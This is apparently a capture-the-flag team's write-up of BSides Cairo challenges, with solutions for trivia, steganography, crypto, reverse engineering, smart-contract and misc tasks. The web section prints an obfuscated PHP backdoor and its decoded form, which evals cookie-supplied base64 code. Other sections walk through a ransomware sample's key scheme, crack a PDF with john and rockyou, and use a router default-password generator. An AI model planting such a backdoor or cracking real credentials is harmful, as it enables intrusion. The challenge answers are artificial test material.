# We are Revers3c Team Got Secound Place
```
Challenge                           Category                    Point           Statue
Search with police              General Information              30             Solved
Vegetables                      General Information              30             Solved
Rocker                          General Information              20             Solved
WhoAmi                          General Information              50             Solved
d3c0d3 m3                          Web Security	          	 50             Solved
$cript kiddie                   Reverse Engineering              50             Solved
Abusing                           Cryptography                   50             Solved
My Router Password                    Misc                       50             Solved
Zoom Eye                          Steganography                  50             Solved
Open the safe                    Smart contract                  75             Solved
Old Style                       Reverse Engineering              150            Solved
Ransom where !                    Cryptography                   100            Solved
Please don't burn my money       Smart contract                  120              No
```
# General Information : 130 Point in 4 Challenge
- Rocker : 20 Point

I attack was published about me in Defcon Conference in 2011 I gain access to your phone during the charging process
to execute attack you need a cable that supports power and data connection together
The is Flag `juice jacking`

- Search with police  : 30 Point

I'm a new tool developed by a company who unlocked ios phone in a terrorist attack in San Bernardino, California.
This tool developed to a physical analyzer for smartphones like android and ios
The is Flag `UFED`

- Vegetables : 30 Point

I'm an operating system based on Linux designed to encrypt your data using onion routing and works through USB only
The is Flag `Tails`


- WhoAmi : 50 Point

I'm Jack and I have a penetration testing process for Automated Teller Machine and I don't have any money to buy rubber ducky or any advanced kits.
I've seen on the internet that I can do this tool with myself with some tools based on open-source hardware, I need something can simulate rubber ducky to inject code and enable PowerShell command or execute a command on Windows...
What's the name of this piece amid the family names?
The is Flag `leonardo`
#
# Web Challenge : d3c0d3 m3 50 Point
- The Challenge is a [zip](https://github.com/X-Vector/CTF/blob/master/Bsides/c99.zip) file Which Contain a php code
```
<?php
$kyo1="JGM9J2NvdW50JzskYT0kX0NPT0tecJRTtecpZihyZecXecNecldCgkYSeck9PSecdecmbCcgJiYgJGMecoJGEpPjMpe2luaec";
$kyo3="zectldmFsecKGecJhc2Uec2NF9kZWNvZGUocHJlZ19ecyZXecBsYWNlKGecFycmF5KCcvW15cdz1cc1ec0vJywnL1xeczLycpLCBhcnJ";
$gj = "bcoxacoxse64cox_coxdcoxecoxccoxode";
$kyo4="heecSgnJywnKycpLCBqb2luKGecFyeccmF5X3NsaWNlKCecRhLCRjKCRhKS0zKSkpKSeckec7ZWNobyAnPC8nLiRrLiecc+Jzt9";
$iuq = "str_replace";
$kyo2="V9zZecXQoJ2Vyeccm9yX2xvZycecsICcvecZGV2L251bGwnKTskecaecz0nYWd7aGlkZGVuecX2eclecuX3BocH0nO2VjecaG8gJzwnLeciRecrLic+J";
$gj = $iuq("cox", "", $gj);
eval($gj($iuq("ec", "", $kyo1.$kyo2.$kyo3.$kyo4)));
?>
```
- first the variable `$iuq` containe a php built in function which is used to replcae any this words `ec` in this variables `$kyo1,$kyo2,$kyo3,$kyo4` with nothing then when excute the code the output will be

```
JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSk9PSdmbCcgJiYgJGMoJGEpPjMpe2luaV9zZXQoJ2Vycm9yX2xvZycsICcvZGV2L251bGwnKTskaz0nYWd7aGlkZGVuX2luX3BocH0nO2VjaG8gJzwnLiRrLic+JztldmFsKGJhc2U2NF9kZWNvZGUocHJlZ19yZXBsYWNlKGFycmF5KCcvW15cdz1cc10vJywnL1xzLycpLCBhcnJheSgnJywnKycpLCBqb2luKGFycmF5X3NsaWNlKCRhLCRjKCRhKS0zKSkpKSk7ZWNobyAnPC8nLiRrLic+Jzt9
```
- decode it with base64 then the output will be
```
$c='count';$a=$_COOKIE;if(reset($a)=='fl' && $c($a)>3){ini_set('error_log', '/dev/null');$k='ag{hidden_in_php}';echo '<'.$k.'>';eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));echo '</'.$k.'>';}
```
- you will see that variable `$a` is `fl` and variable `$k` is `ag{hidden_in_php}` so your flag is `flag{hidden_in_php}`
#
# Steganography : Zoom Eye 50 Point
- The Challenge is a [zip](https://github.com/X-Vector/CTF/blob/master/Bsides/invokeme.zip) file Which Contain a image They Give us The Password of zip file `squnity`
- I'm Extract The zip file and found that the image is 13 Mbyte , So There a something hidden in the photo
- I'm used steghide in linux `steghide extract -sf rockme.jpg` , you can install it `apt install steghide`
- steghide requierd a password !!! , I see The Photo and zoom in When I found This Words With Grey Color :D
![Password](https://github.com/X-Vector/CTF/blob/master/Bsides/stage2.png?raw=true)
- I try to set this words `l3757ryh4rd3r` as password and the reinvoke.txt file is output
- The File Contain This Character and string
```
{@C6> xADF> :D D:>A=J 5F>>J E6IE @7 E96 AC:?E:?8 2?5 EJA6D6EE:?8 :?5FDECJ] {@C6> xADF> 92D 366? E96 :?5FDECJVD DE2?52C5 5F>>J E6IE 6G6C D:?46 E96 `d__D[ H96? 2? F?<?@H? AC:?E6C E@@< 2 82==6J @7 EJA6 2?5 D4C2>3=65 :E E@ >2<6 2 EJA6 DA64:>6? 3@@<] xE 92D DFCG:G65 ?@E @?=J 7:G6 46?EFC:6D[ 3FE 2=D@ E96 =62A :?E@ 6=64EC@?:4 EJA6D6EE:?8[ C6>2:?:?8 6DD6?E:2==J F?492?865] xE H2D A@AF=2C:D65 :? E96 `he_D H:E9 E96 C6=62D6 @7 {6EC2D6E D966ED 4@?E2:?:?8 {@C6> xADF> A2DD286D[ 2?5 >@C6 C646?E=J H:E9 56D<E@A AF3=:D9:?8 D@7EH2C6 =:<6 p=5FD !286|2<6C :?4=F5:?8 G6CD:@?D @7 {@C6> xADF>]
7=28L5bGb=_Ab507_C0fc=b?fdN
```
- I Think and search in google When I found it's rot47
- I go to [decode.fr](https://www.dcode.fr/rot-47-cipher) and decode it , The Output is
```
Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
flag{d3v3l0p3d_f0r_74l3n75}flag{d3v3l0p3d_f0r_74l3n75}
```
- Then The Flag is `flag{d3v3l0p3d_f0r_74l3n75}`
#
# Crypto Challenge : abusing 50 Point
- The Challenge is a [mp3](https://github.com/X-Vector/CTF/blob/master/Bsides/abusing.mp3) file Which This Sound Like Morse code
- Go to this [website](https://morsecode.scphillips.com/labs/audio-decoder-adaptive/) then upload mp3 file and you get this result
![Morse code](https://github.com/X-Vector/CTF/blob/master/Bsides/morse.png?raw=true)
- We Play in This Words `ETTE L A G I N M C O D E W E T R U S T` To Get This Result `FLAGINMCODEWETRUST` Then We Submit and we get is wrong Then we add `{}_` to words to be `FLAG{IN_MCODE_TRUST}` and Flag is Correct
#
# Crypto Challenge : Ransom where ! 100 Point
- The Challenge is a [zip]() file which contain some file and a file called `Ransomware.exe`
- When We use dnspy to decompile The File and The Result is
![Debugging](https://github.com/X-Vector/CTF/blob/master/Bsides/crypto.webp?raw=true)
- we have a two cs file `cryptography.cs` and  `Program.cs`
- The File `cryptography.cs` comtaine The Function That used in Encryption and The file `Program.cs` is a main File
- in `Program.cs` we have this code
```
Random random = new Random();
int value = random.Next(10000000, 1211656790);
int value2 = random.Next(10000000, 1211656790);
int value3 = random.Next(10000000, 1211656790);
int value4 = random.Next(10000000, 1211656790);
int value5 = random.Next(10000000, 1211656790);
string str = ".tmp";
BigInteger left = BigInteger.Multiply(value, value2);
left += BigInteger.Multiply(value2, value3);
left += BigInteger.Multiply(value3, value4);
left += BigInteger.Multiply(value4, value5);
left += BigInteger.Multiply(value5, value);
BigInteger[] array = new BigInteger[]
{
              BigInteger.Parse("318540665379393469901456665807211509077755719995811520039095212139429238053864597311950397094944291616119321660193803737677538864969915331331528398734504661147661499115125056479426948683504604460936703005724827506058051215012025774714463561829608252938657297504427643593752676857551877096958959488289759878259498255905255543409142370769036479607835226542428818361327569095305960454592450213005148130508649794732855515489990191085723757628463901282599712670814223322126866814011761400443596552984309315434653984387419451894484613987942298157348306834118923950284809853541881602043240244910348705406353947587203832407"),
  BigInteger.Parse("338630205260455689413627911306068443537112802550361922213620660503310212139001530156458392949653034244789612680980241965923780722889133495349537107789761426092510299239678696031652780059016898519278860185536978111680123402473365833456785718098200501968322228116681190425490850863660038143310790555506293106653050174262471649179173093656763946257235681980586392230447218179278964626176124426615857733950102117938674282636936094069075258237416065546593509302494726576026227551920883962084579635168761189995794814926094510046419165007371450799003658587100556051088147493947712592469412133312536422828670173807709914587")
};
string str2 = Program.RandomString(5);
```
- Which we have 5 variable `value,value2,value3,value4,value5` That take a random Number and `str` Which contain `.tmp` and variable `left` Which equal
` value*value2 + value2*value3 + value3*value4 + value4*value5 + value5*value ` and We have array `BigInteger` that containe Two Big integer Number
and a string variable `str2` that have a five random string
- and in `Program.cs` We have this code
```
File.WriteAllText(Path.GetTempPath() + str2 + str, Convert.ToString(cryptography.RSA_m_n_e(left.ToString(), array[1], array[0])));
```
- We have a file that saved in our path which his name is the 5 random string with .tmp extension
- This File contain The result of function `cryptography.RSA_m_n_e(left.ToString(), array[1], array[0]))`
- When I See this Function in `cryptography.cs` I Found That take 3 Parameter Which The First is string Which is Coming from The result of left and The Secound Parameter Take The second BigInteger in array and the Third take the First BigInteger in array
- This Function is RSA Function Which This Attack is Wiener Attack Becouse `e` is Very BigInteger
- Let's see The tmp file That Saved in our path
- We have 4 file which have 5 string and this extension is .tmp and all of them contain a BigInteger
- The RSA Function encode the Plaintext and saved the Cipher in a one file from our 4 file , So I decode all cipher in 4 files and get this Number
```
3599427841201158309
2281123928613928259
1613383286900676679
2413992114436498344
```
- You Can use My [RSA Tool](https://github.com/X-Vector/X-RSA) That I publish it in github To decode This RSA Attack and decode other Attacks
- Now This Numbers contain a right random number
- We have This code in `Program.cs`
```
string s = File.ReadAllText(".\\sdagfsad.txt");
byte[] bytes = Encoding.UTF8.GetBytes(s);
string contents = cryptography.Aes(bytes, left.ToString(), "ABCDEFGHIJ12", true, false);
File.WriteAllText(".\\dsafgasf.txt", contents);
File.Delete(".\\sdagfsad.txt");
}
```
- in The Third Linr of This Code , We have a AES Encryption Function When We go to `cryptography.cs` We see that in this Code
```
public static string Aes(byte[] input, string key, string iv, bool Enc, bool Dec)
{
  new UTF8Encoding();
  AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
  aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
  aesCryptoServiceProvider.KeySize = 256;
  aesCryptoServiceProvider.Key = Convert.FromBase64String(cryptography.sha2(key));
  aesCryptoServiceProvider.BlockSize = 128;
  aesCryptoServiceProvider.IV = Convert.FromBase64String(cryptography.md5(iv));
  aesCryptoServiceProvider.Mode = CipherMode.CBC;
  if (Enc && !Dec)
  {
    ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateEncryptor();
    byte[] array = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
    return Convert.ToBase64String(array);
  }
  if (!Enc && Dec)
  {
    ICryptoTransform cryptoTransform2 = aesCryptoServiceProvider.CreateDecryptor();
    byte[] array = cryptoTransform2.TransformFinalBlock(input, 0, input.Length);
    return Encoding.ASCII.GetString(array);
  }
  return null;
}
```
- He use a CBC_MODE and The Keysize is 256 bits and BlockSize is 128 bit
- He Give Me iv and i have 4 random number on of them is a right number so I Try all Number With His Function and The Cipher is saved in dsafgasf.txt and iv is `ABCDEFGHIJ12`
- So I call AES Function in this figure `cryptography.Aes(bytes, MyRandomKey, "ABCDEFGHIJ12", false, true)` in 4 Random number and The Right Number is `2281123928613928259`
  ![untitled](https://user-images.githubusercontent.com/46635361/51080747-eb287900-16e9-11e9-90a2-967abc8c6088.png)
- Then The Flag is `Bsides{IT's_Trivial_Ransomware}`
#
# Reverse Engneering | $cript kiddie 50 Point

- We Have a [zip file](https://github.com/X-Vector/CTF/raw/master/Bsides/script.exe.zip)
- Running the binary will give us this a messagebox showing hex encoded value

![picture1](https://user-images.githubusercontent.com/46635361/51079417-70526480-16cf-11e9-879a-396c57c04aca.png)

- using PEstudio you can find that the binary was packeds using UPX

![picture2](https://user-images.githubusercontent.com/46635361/51079452-07b7b780-16d0-11e9-8dfc-ae13b9ec93ad.png)

- Disable ASLR & Unpack it

![picture3](https://user-images.githubusercontent.com/46635361/51079512-fc18c080-16d0-11e9-9c2b-3e1dba69c7a1.png)

- using x64dbg you can find that it uses [IsDebuggerPresent](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680345(v=vs.85).aspx) function to dentermine whenever there is a debugger or not and if there is a debugger a messagebox saying 'This is a third-party compiled AutoIt script.' will show instead.

![untitled](https://user-images.githubusercontent.com/46635361/51079617-b4933400-16d2-11e9-8203-0c3641e5a6a6.png)

- Here you can find how to detect AutoIt compailed scripts [AutoIt Malware: From Compiled Binary to Plain-Text Script](https://r3mrum.wordpress.com/2017/07/10/autoit-malware-from-compiled-binary-to-plain-text-script/)

- Now let's reverse it !

- using EXE2aut you can extract the actual script

![untitled](https://user-images.githubusercontent.com/46635361/51079703-45b6da80-16d4-11e9-88c6-36f893e67ae0.png)

- Here, near the buttom you can find this function

```
Func cmmkxdi()
	Global $povvyzid_qgidn_wyfvjlrasdasd = 202
	Local $texjyuus_kxmczmsui_waowsej = "0xAFAF301D3DF20EE93EB8B8A9842FB0781FEFAAB30F4628D4"
	Global $qw_vouefw_jxcp_ucasdasd = 46689
	Local $var_1044 = asdasfcyzncmmkxdiasd(False, $texjyuus_kxmczmsui_waowsej, "i4m_th3_fl@g")
	Global $aycqkqgdnvzzuelotalsibomsdsd = 116
	MsgBox($mb_systemmodal, "BSides Cairo", $texjyuus_kxmczmsui_waowsej)
EndFunc
```

- so all we need here is to print var_1044 value instead of the hex encoded values in texjyuus_kxmczmsui_waowsej, Change the code to

```
Func cmmkxdi()
	Global $povvyzid_qgidn_wyfvjlrasdasd = 202
	Local $texjyuus_kxmczmsui_waowsej = "0xAFAF301D3DF20EE93EB8B8A9842FB0781FEFAAB30F4628D4"
	Global $qw_vouefw_jxcp_ucasdasd = 46689
	Local $var_1044 = asdasfcyzncmmkxdiasd(False, $texjyuus_kxmczmsui_waowsej, "i4m_th3_fl@g")
	Global $aycqkqgdnvzzuelotalsibomsdsd = 116
	MsgBox($mb_systemmodal, "BSides Cairo", $var_1044)
EndFunc
```

- and run it using the AutoIT interpreter

![untitled](https://user-images.githubusercontent.com/46635361/51079752-c88c6500-16d5-11e9-8baa-800c582f9dc8.png)
#
# Reverse Engneering | Old Style 150 Point

- We Have a [zip file](https://github.com/X-Vector/CTF/raw/master/Bsides/Reverse.zip)
- We were given two binaries with zero imports, a pretty common obfuscation technique used by real-life malwares
![ss](https://user-images.githubusercontent.com/46635361/51080312-c6300800-16e1-11e9-8e79-6ab54bce4d9a.png)

- upload Mal_1.exe to [hybrid-analysis.com](hybrid-analysis.com/sample/42512f779a32d5e677e534ad87524e886a80572c2de4e47ed993e264735b31ba)

- there are 4 Extraced files one of them named config.vbe which is a [vbs compailed script](https://fileinfo.com/extension/vbe)

![extracted_files](https://user-images.githubusercontent.com/46635361/51080022-7b5fc180-16dc-11e9-8ad6-3d643b5cb37c.png)

- and the malware will delete itself at some point using powershell

![untitled](https://user-images.githubusercontent.com/46635361/51080134-b662f480-16de-11e9-9e01-566b8f14c003.png)

- now let's get the extracted files ourselves .. open up your win7 debugging vm and just use any file monitor tool i used Moo0, then run the binary.

![s](https://user-images.githubusercontent.com/46635361/51080067-a1399600-16dd-11e9-9c09-9644c2c71c43.png)

- locate and decode config.vbe using  decode-vbe.py

![decode_vbe](https://user-images.githubusercontent.com/46635361/51080078-ce864400-16dd-11e9-8f34-3c3998fcaf19.png)

- the same vbs script can be found within hybrid-analysis report too.

![untitled](https://user-images.githubusercontent.com/46635361/51080092-291fa000-16de-11e9-8e9e-10e53d0fe102.png)

- The Flag is `vb$_dr0pp3r5_4r3_c0mm0n`

#
# Smart Contract : Open the safe 75 Point

- The Challenge Give Me Two Link [Fisrt Link](https://ropsten.etherscan.io/block/4806991) and [Secound Link](https://ropsten.etherscan.io/tx/0xa88c4db8bf7a74a5987aa6efd50a5adf2383e5050bb67dbd9dcad68b52dd68a7)
- When We Open First Link We Found That he give me Block Information not More
- When We Open Secound Link We Found That he give me a Transaction Information and in it we Find Input Data
```
0x60806040526040516103973803806103978339810180604052602081101561002657600080fd5b81019080805164010000000081111561003e57600080fd5b8281019050602081018481111561005457600080fd5b815185600182028301116401000000008211171561007157600080fd5b5050929190505050806000908051906020019061008f929190610096565b505061013b565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100d757805160ff1916838001178555610105565b82800160010185558215610105579182015b828111156101045782518255916020019190600101906100e9565b5b5090506101129190610116565b5090565b61013891905b8082111561013457600081600090555060010161011c565b5090565b90565b61024d8061014a6000396000f3fe608060405260043610610046576000357c01000000000000000000000000000000000000000000000000000000009004806312065fe0146100485780635807bb5614610073575b005b34801561005457600080fd5b5061005d61013b565b6040518082815260200191505060405180910390f35b34801561007f57600080fd5b506101396004803603602081101561009657600080fd5b81019080803590602001906401000000008111156100b357600080fd5b8201836020820111156100c557600080fd5b803590602001918460018302840111640100000000831117156100e757600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f82011690508083019250505050505050919291929050505061015a565b005b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b8080519060200120818051906020012014151561017657600080fd5b60003073ffffffffffffffffffffffffffffffffffffffff16319050803373ffffffffffffffffffffffffffffffffffffffff167fb2559daa129ad136aac2133ac6a0c75920abbef7d6663a017a94e181b13786c360405160405180910390a33373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f1935050505015801561021c573d6000803e3d6000fd5b50505056fea165627a7a72305820fd61f5f9ee9bae04702d0b9b28201ac9637b7e33cf2d3f09f60480855e10a1b1002900000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000014666c61677b566974616c696b4275746572696e7d000000000000000000000000
```
- When We decode it to Ascii or utf-8 the Out Put Will be
```
``@R`@Qa8a9`@R` a&W`ý[Qda>W`ý[P` aTW`ý[Q`daqW`ý[PPPPP`Q` aaV[PPa;V[T``a``R` ` `` `a×WQ`ÿUaV[`UaW[aWQU` `aéV[[PPaaV[PV[a8[a4W``UP`aV[PV[V[aMaJ`9`óþ``@R`6aFW`5|c_àaHWcX»VasW[[4aTW`ý[Pa]a;V[`@QR` PP`@Qó[4aW`ý[Pa9`6` aW`ý[5` da³W`ý[` aÅW`ý[5` `daçW`ý[`` ` `@Q`@RR` 7`R``PPPPPPPPPPPaZV[[`0sÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ1PV[Q`  Q`  avW`ý[`0sÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ1P3sÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ²UªÑ6ªÂ:Æ ÇY «¾÷Öf:zá±7Ã`@Q`@Q£3sÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿaü`@Q``@QñPPPPaW=`>=`ý[PPPVþ¡ebzzr0X ýaõùî®p-( Éc{~3Ï-?	ö^¡±) flag{VitalikButerin}
```
- The Flag in Last Line `flag{VitalikButerin}`
#
# Misc : My Router Password 50 Point
- He give Me a [zip file](https://github.com/X-Vector/CTF/raw/master/Bsides/paper.zip) When We Extract it We found a pdf file with password
- We use Jhon The rapper tool or you can use this [Script](https://github.com/kholia/npdf2john/blob/master/pdf2john.pl) To Extract The hash of pdf
```
./pdf2john.pl /home/x-vector/Downloads/squnity/paper/paper.pdf >/home/x-vector/Desktop/hash.txt
```
- The `hash.txt` Contain This Out Put
```
/home/x-vector/Downloads/squnity/paper/paper.pdf:$pdf$2*3*128*-3904*1*16*54ac446c794046bfa6bc3423eee8c2a1*32*9526e8d4ab35530a1100ca08542728bc00000000000000000000000000000000*32*7088c948dbba296d79481d0dda841ccec67c1054f5fc4fc331dd37d8a77226e2
```
- We remove Every Thing befor `:` The The Out put Will be
```
$pdf$2*3*128*-3904*1*16*54ac446c794046bfa6bc3423eee8c2a1*32*9526e8d4ab35530a1100ca08542728bc00000000000000000000000000000000*32*7088c948dbba296d79481d0dda841ccec67c1054f5fc4fc331dd37d8a77226e2
```
- use john tool to get the password with [rockyou wordlist](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
```
john --wordlist /home/x-vector/Desktop/rockyou.txt /home/x-vector/Desktop/hash.txt
```
- The Password is `24118904126814948`
- Now Open The PDF File We Will found image which require a password and he give me a username `UPC3946855`
![router](https://github.com/X-Vector/CTF/raw/master/Bsides/ss.png)
- I search in google and found That UPC is router which can accept some password and found this [Website](http://ubee.deadcode.me/) Which Compute The Password of router
- I take The First Password and Submit it and it's The Flag `APEJFUWD`
